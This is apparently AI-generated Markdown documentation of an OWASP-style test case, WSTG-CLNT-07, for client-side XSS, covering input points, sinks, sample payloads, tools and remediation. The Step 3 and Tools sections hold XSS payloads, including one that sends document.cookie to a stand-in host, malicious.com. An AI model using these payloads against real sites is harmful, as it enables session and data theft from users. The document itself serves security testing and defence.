Here’s the documentation for **WSTG-CLNT-07** in Markdown format:


# WSTG-CLNT-07: Testing for Cross-Site Scripting (XSS) - Client-Side

## Summary

Client-side Cross-Site Scripting (XSS) vulnerabilities occur when a web application allows an attacker to inject and execute malicious scripts within the context of a user's browser. Unlike server-side XSS, these vulnerabilities originate in the client-side code due to improper handling of dynamic content.

## Objective

To identify and exploit client-side XSS vulnerabilities caused by insecure JavaScript code, enabling attackers to execute unauthorized scripts, steal sensitive data, or perform malicious actions.

## How to Test

### Step 1: Identify Input Points
1. Locate areas where the application dynamically updates the DOM based on user input, such as:
   - URL parameters
   - Query strings or fragments
   - Form fields
   - Cookies, localStorage, or sessionStorage

2. Inspect client-side JavaScript for functions that process user inputs and directly update the DOM.

---

### Step 2: Analyze JavaScript Code
1. Review JavaScript code for unsafe patterns, including:
   - Direct assignment to `innerHTML`, `outerHTML`, or `document.write()`.
   - Usage of `eval()` or similar functions.
   - Appending unsanitized user inputs to DOM elements.

2. Identify sources, sinks, and sanitization mechanisms in the code:
   - **Sources**: Inputs that influence the DOM (e.g., `window.location`, `document.cookie`).
   - **Sinks**: Functions that update the DOM (e.g., `innerHTML`, `appendChild()`).
   - **Sanitization**: Check if user inputs are properly sanitized or escaped.

---

### Step 3: Test for XSS
1. Inject XSS payloads into identified input points, such as:
   ```javascript
   <script>alert('XSS')</script>
   "><img src=x onerror=alert(1)>
```

2. Test dynamic scenarios:
    
    - Update URL parameters and observe changes in the DOM.
    - Modify values in cookies or storage and check for script execution.
3. Use browser developer tools to monitor DOM changes and script execution.
    

---

### Step 4: Validate Exploitability

1. Confirm if the injected script executes in the browser.
2. Assess the potential impact, such as:
    - Stealing cookies, tokens, or sensitive data.
    - Performing unauthorized actions on behalf of the user.

---

## Tools

- **Browser Developer Tools** for inspecting DOM and testing JavaScript inputs.
- **Burp Suite** or **OWASP ZAP** for intercepting and modifying HTTP requests.
- **DOM XSS Scanner** for analyzing client-side scripts for vulnerabilities.
- **Custom JavaScript Payloads** for advanced testing:
    
    ```javascript
    "<script>fetch('https://malicious.com?cookie='+document.cookie)</script>"
    ```
    

---

## Remediation

1. **Use Secure DOM Manipulation Methods**:
    
    - Replace `innerHTML` with `textContent` or `createElement()`.
2. **Sanitize and Escape User Inputs**:
    
    - Use libraries like DOMPurify to sanitize inputs before updating the DOM.
    - Apply proper escaping for context-specific outputs (HTML, JavaScript, URL).
3. **Avoid Dangerous JavaScript Functions**:
    
    - Do not use `eval()`, `document.write()`, or similar functions.
4. **Implement Content Security Policy (CSP)**:
    
    - Enforce a restrictive CSP to prevent unauthorized script execution.
5. **Perform Regular Code Reviews and Testing**:
    
    - Periodically audit client-side code for insecure patterns.

---

## References

- [OWASP Testing Guide - Client-Side XSS](https://owasp.org/www-project-testing/)
- [OWASP Top Ten - A03:2021 Injection](https://owasp.org/Top10/A03_2021-Injection/)
- [Google Security - DOM XSS Prevention Cheat Sheet](https://developers.google.com/web/fundamentals/security/csp)



